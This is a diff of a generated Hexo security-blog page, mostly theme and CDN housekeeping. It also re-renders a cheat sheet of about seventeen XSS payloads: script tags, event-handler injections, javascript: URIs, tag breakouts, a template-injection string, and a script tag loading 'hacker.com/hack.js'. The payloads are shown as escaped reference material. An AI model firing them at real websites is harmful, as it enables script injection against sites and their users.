@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -399,7 +399,24 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">Script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1);&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onunload</span>=<span class="hljs-string">&quot;alert(1);&quot;</span>&gt;</span><br>&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br>&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br> data:text/html,<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br> */alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>/*<br><span class="javascript"> <span class="hljs-title">constructor</span>.<span class="hljs-title">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="hljs-params"></span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+  <pre><code class="html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;Script&gt;alert(1)&lt;/Script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+&lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt;
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt;
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
+&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt;
+&lt;body onload=&quot;alert(1);&quot;&gt;
+&lt;body onunload=&quot;alert(1);&quot;&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+ &lt;/style&gt;&lt;svg onload=alert(1)&gt;
+ data:text/html,&lt;svg onload=alert(1)&gt;
+ &lt;/script&gt;&lt;svg onload=alert(1)&gt;
+ */alert(1)&lt;/script&gt;&lt;script&gt;/*
+ constructor.constructor(&#39;alert(/xss/)&#39;)()&#125;&#125;</code></pre>
+
   
   
     
@@ -412,7 +429,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/04/22/xssgame-200422/" title="xss game Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">xss game Write up</span></a><a class="item" href="/2020/04/22/jwtinjection-200422/" title="JWT None Type Injection" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">JWT None Type Injection</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/04/22/xssgame-200422/" title="xss game Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">xss game Write up</span></a><a class="item" href="/2020/05/15/function-rce-200515/" title="create_function() RCE 취약점 정리" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">create_function() RCE 취약점 정리</span></a></div></section></div>
       
       
       
@@ -660,7 +677,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -739,7 +756,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -857,29 +874,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -981,7 +975,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -993,7 +987,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
